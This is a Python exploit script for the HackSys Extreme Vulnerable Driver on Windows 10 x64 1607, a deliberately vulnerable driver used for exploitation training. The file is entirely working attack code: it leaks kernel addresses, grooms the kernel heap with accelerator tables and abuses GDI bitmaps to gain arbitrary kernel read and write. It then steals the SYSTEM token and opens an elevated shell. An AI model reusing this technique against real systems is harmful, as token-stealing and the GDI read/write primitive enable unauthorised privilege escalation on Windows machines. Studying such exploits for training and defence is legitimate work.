import ctypes, struct, sys, os, win32con, time
from ctypes import *
from ctypes.wintypes import *
from win32com.shell import shell

ntdll = windll.ntdll
kernel32 = windll.kernel32
gdi32 = windll.gdi32
user32 = windll.user32


def debug_print(message):
	print message
	kernel32.OutputDebugStringA(message + "\n")
	
	
class SYSTEM_MODULE_INFORMATION(Structure):
    _fields_ = [("Reserved", c_void_p * 2),
                ("ImageBase", c_void_p), 
                ("ImageSize", c_long),
                ("Flags", c_ulong),
                ("LoadOrderIndex", c_ushort),
                ("InitOrderIndex", c_ushort),
                ("LoadCount", c_ushort),
                ("ModuleNameOffset", c_ushort),
                ("FullPathName", c_char * 256)]


def get_base_address(input_modules):
	""" Returns base address of kernel modules """
	modules = {}

	# Allocate arbitrary buffer and call NtQuerySystemInformation
	system_information = create_string_buffer(0)
	systeminformationlength = c_ulong(0)
	ntdll.NtQuerySystemInformation(11, system_information, len(system_information), byref(systeminformationlength))
	
	# Call NtQuerySystemInformation second time with right size
	system_information = create_string_buffer(systeminformationlength.value)
	ntdll.NtQuerySystemInformation(11, system_information, len(system_information), byref(systeminformationlength))
	
	# Read first 4 bytes which contains number of modules retrieved
	module_count = c_ulong(0)
	module_count_string = create_string_buffer(system_information.raw[:8])
	ctypes.memmove(addressof(module_count), module_count_string, sizeof(module_count))
	
	# Marshal each module information and store it in a dictionary<name, SYSTEM_MODULE_INFORMATION>
	system_information = create_string_buffer(system_information.raw[8:])
	for x in range(module_count.value):
		smi = SYSTEM_MODULE_INFORMATION()
		temp_system_information = create_string_buffer(system_information.raw[sizeof(smi) * x: sizeof(smi) * (x+1)])
		ctypes.memmove(addressof(smi), temp_system_information, sizeof(smi))
		module_name =  smi.FullPathName.split('\\')[-1]
		modules[module_name] = smi
		
	debug_print ("\r\n[+] NtQuerySystemInformation():")
		
	# Get base addresses and return them in a list
	base_addresses = []
	for input_module in input_modules:
		try:
			base_address = modules[input_module].ImageBase
			debug_print ("\t[-] %s base address: 0x%X" % (input_module, base_address))
			base_addresses.append(base_address)
		except:
			base_addresses.append(0)
	
	return base_addresses
		
	
def get_PsISP_kernel_address():	
	""" Returns kernel base address of PsInitialSystemProcess """
	# Get kernel image base
	kernelImage = "ntoskrnl.exe"
	base_addresses = get_base_address(kernelImage.split())
	kernel_image_base = base_addresses[0]
	print "[+] Nt Base Address: 0x%X" % kernel_image_base
	
	# Load kernel image in userland and get PsInitialSystemProcess offset
	kernel32.LoadLibraryA.restype = HMODULE
	hKernelImage = kernel32.LoadLibraryA(kernelImage)
	print "[+] Loading %s in Userland" % kernelImage
	print "[+] %s Userland Base Address : 0x%X" % (kernelImage, hKernelImage)
	kernel32.GetProcAddress.restype = c_ulonglong
	kernel32.GetProcAddress.argtypes = (HMODULE, LPCSTR)
	PsISP_user_address = kernel32.GetProcAddress(hKernelImage,"PsInitialSystemProcess")
	print "[+] PsInitialSystemProcess Userland Base Address: 0x%X" % PsISP_user_address
	
	# Calculate PsInitialSystemProcess offset in kernel land
	PsISP_kernel_address_ptr = kernel_image_base + ( PsISP_user_address - hKernelImage)
	print "[+] PsInitialSystemProcess Kernel Base Address: 0x%X" % PsISP_kernel_address_ptr
	
	PsISP_kernel_address = c_ulonglong()
	read_virtual(PsISP_kernel_address_ptr, byref(PsISP_kernel_address), sizeof(PsISP_kernel_address));	
	
	return PsISP_kernel_address.value
	
	
hManager = HBITMAP()
hWorker = HBITMAP()
	
def setup_manager_bitmap():
	""" Creates Manager Bitmap """
	global hManager
	dwReturn = c_void_p()
	gdi32.CreateBitmap.restype = HBITMAP
	hManager = gdi32.CreateBitmap(0x100, 0x6D, 1, 0x1, dwReturn) # Win10x64 size = 0x1000
	debug_print ("\t[+] Manager Bitmap handle: 0x%X" % hManager)

	
def setup_worker_bitmap():
	""" Creates Worker Bitmap """
	global hWorker
	dwReturn = c_void_p()
	gdi32.CreateBitmap.restype = HBITMAP
	hWorker = gdi32.CreateBitmap(0x100, 0x6D, 1, 0x1, dwReturn) # size = 0x1000
	debug_print ("\t[+] Worker Bitmap handle: 0x%X" % hWorker)
	
	
def set_address(address):
	""" Sets pvScan0 value of Worker Bitmap  """
	global hManager
	write_buf = c_ulonglong(address)
	gdi32.SetBitmapBits.argtypes = (HBITMAP, c_ulonglong, LPVOID)
	gdi32.SetBitmapBits(hManager, sizeof(write_buf), addressof(write_buf));

	
def write_virtual(dest, src, len):
	""" Writes value pointed at by Worker Bitmap """
	global hWorker
	set_address(dest)
	gdi32.SetBitmapBits.argtypes = (HBITMAP, c_ulonglong, LPVOID)
	gdi32.SetBitmapBits(hWorker, len, src)
	
	
def read_virtual(src, dest, len):
	""" Reads value pointed at by Worker Bitmap """
	global hWorker
	set_address(src)
	gdi32.GetBitmapBits.argtypes = (HBITMAP, LONG, LPVOID)
	gdi32.GetBitmapBits(hWorker, len, dest)
	
	
# Win10 x64 1607 specific offsets
# kd> dt nt!_EPROCESS uniqueprocessid token activeprocesslinks.
#   +0x2e8 UniqueProcessId : Ptr64 Void
#   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
#      +0x000 Flink            : Ptr64 _LIST_ENTRY
#      +0x008 Blink            : Ptr64 _LIST_ENTRY
#   +0x358 Token           : _EX_FAST_REF

unique_process_id_offset = 0x2E8
active_process_links_offset = 0x2F0
token_offset = 0x358
	
# Get EPROCESS of current process
def get_current_eprocess(pEPROCESS):
	""" Returns ptr to Current EPROCESS structure """
	flink = c_ulonglong()
	read_virtual(pEPROCESS + active_process_links_offset, byref(flink), sizeof(flink));	
	
	current_pEPROCESS = 0
	while (1):
		unique_process_id = c_ulonglong(0)
		
		# Adjust EPROCESS pointer for next entry
		pEPROCESS = flink.value - unique_process_id_offset - 0x8
		
		# Get PID
		read_virtual(pEPROCESS + unique_process_id_offset, byref(unique_process_id), sizeof(unique_process_id));	
		
		# Check if we're in the current process
		if (os.getpid() == unique_process_id.value):
			current_pEPROCESS = pEPROCESS
			break
			
		read_virtual(pEPROCESS + active_process_links_offset, byref(flink), sizeof(flink));	
		
		# If next same as last, we've reached the end
		if (pEPROCESS == flink.value - unique_process_id_offset - 0x8):
			break
		
	return current_pEPROCESS
	
	
class ACCEL(Structure):
    _fields_ = [("fVirt", BYTE),
                ("key", WORD), 
                ("cmd", WORD)]
				
class ACCEL_ARRAY(Structure):
    _fields_ = [("ACCEL_ARRAY", POINTER(ACCEL) * 675)]
	
def alloc_free_accelerator_tables():
	""" Allocates and Frees Accelerator Tables until last 2 addresses match """
	previous_entry = 0
	while (1):
		accel_array = ACCEL_ARRAY()
		hAccel = user32.CreateAcceleratorTableA(addressof(accel_array), 675) # size = 0x1000
		entry = get_entry_from_handle(hAccel)
		user32.DestroyAcceleratorTable(hAccel)
		if previous_entry == entry:
			debug_print ("\t[+] Duplicate AcceleratorTable: 0x%X" % entry)
			return entry
		previous_entry = entry
	
	
def get_entry_from_handle(handle):
	""" Returns kernel pointer of Accelerator Table given a Handle to it """
	kernel32.GetProcAddress.restype = c_ulonglong
	kernel32.GetProcAddress.argtypes = (HMODULE, LPCSTR)
	gSharedInfo_address = kernel32.GetProcAddress(user32._handle,"gSharedInfo")
	handle_entry = cast (gSharedInfo_address + 0x8, POINTER(c_void_p))
	pHead_ptr_ptr = handle_entry.contents.value + (handle & 0xFFFF) * 0x18
	pHead_ptr = cast(pHead_ptr_ptr, POINTER(c_void_p))
	return pHead_ptr.contents.value
	
	
def trigger_arbitrary_overwrite():
	""" Main Logic """
	driver_handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000,0, None, 0x3, 0, None)
	if not driver_handle or driver_handle == -1:
		print "[!] Driver handle not found : Error " + str(ctypes.GetLastError())
		sys.exit()
		
	global hManager, hWorker
	
	# Massaging heap for Manager Bitmap
	debug_print ("[>] Setting up Manager Bitmap:")
	debug_print ("\t[+] Allocating and Freeing AcceleratorTables")
	dup_address = alloc_free_accelerator_tables()
	setup_manager_bitmap()
	hManager_pvscan0_offset = dup_address + 0x50
	debug_print ("\t[+] Manager Bitmap pvscan0 offset: 0x%X" % hManager_pvscan0_offset)
	
	# Massaging heap for Worker Bitmap
	debug_print ("\n[>] Setting up Worker Bitmap:")
	debug_print ("\t[+] Allocating and Freeing AcceleratorTables")
	dup_address = alloc_free_accelerator_tables()
	setup_worker_bitmap()
	hWorker_pvscan0_offset = dup_address + 0x50
	debug_print ("\t[+] Worker Bitmap pvscan0 offset: 0x%X" % hWorker_pvscan0_offset)
	
	# Using WWW to overwrite Manager pvscan0 value with address of Worker pvscan0
	write_where = hManager_pvscan0_offset
	write_what_ptr = c_void_p(hWorker_pvscan0_offset)	
	evil_input = struct.pack("<Q", addressof(write_what_ptr)) +  struct.pack("<Q", write_where)
	evil_input_ptr = id(evil_input) + 32
	evil_size  = len(evil_input)
	debug_print ("\n[+] Triggering W-W-W to overwrite Manager pvscan0 value with Worker pvscan0 address")
	dwReturn = c_ulong()
	kernel32.DeviceIoControl(driver_handle, 0x22200B, evil_input_ptr, evil_size, None, 0,byref(dwReturn), None)	
	
	# Get SYSTEM EPROCESS
	system_EPROCESS = get_PsISP_kernel_address()
	debug_print ("\n[+] SYSTEM EPROCESS: 0x%X" % system_EPROCESS)
	
	# Get current EPROCESS
	current_EPROCESS = get_current_eprocess(system_EPROCESS)
	debug_print ("[+] current EPROCESS: 0x%X" % current_EPROCESS)
	
	system_token = c_ulonglong()
	debug_print ("\r\n[+] Reading System TOKEN")
	read_virtual(system_EPROCESS + token_offset, byref(system_token), sizeof(system_token));
	debug_print ("[+] Writing System TOKEN")
	write_virtual(current_EPROCESS + token_offset, byref(system_token), sizeof(system_token));
	
	if shell.IsUserAnAdmin():
		print "[*] Enjoy Elevated Privs !\r\n"
		os.system('cmd.exe')
	else:
		print "[-] Exploit did not work. Re-run it!"
	

def preamble():
	""" Description """
	debug_print ("")
	debug_print ("HackSys Extreme Vulnerable Driver : Arbitrary Overwrite")
	debug_print ("")
	debug_print ("Target Machine : Windows 10 64-bit (1607)")
	debug_print ("Author: @GradiusX")
	debug_print ("References: Abusing GDI for ring0 exploit primitives: RELOADED (Diego Juarez & Nicolas Economou)")
	debug_print ("")
	
	
if __name__ == '__main__':
	""" Main Function """
	preamble()
	trigger_arbitrary_overwrite()